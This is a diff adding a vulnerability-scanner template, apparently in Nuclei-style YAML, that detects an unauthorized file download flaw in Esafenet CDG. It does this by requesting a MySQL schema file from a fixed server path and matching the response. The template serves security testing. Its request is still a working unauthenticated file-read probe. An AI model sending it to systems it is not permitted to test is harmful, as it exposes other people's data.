@@ -1,0 +1,30 @@
+id: esafenet-mysql-fileread
+brief:
+    title: Esafenet CDG mysql - File Read
+    by: DhiyaneshDk
+    level: high
+    about: CDGServer3 Unauthorized File Download vulnerability is detected.
+    label:
+        - esafenet
+        - lfi
+        - mysql
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql'
+      signs:
+        - "on": word
+          has:
+            - varchar
+            - create table
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/x-sql
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
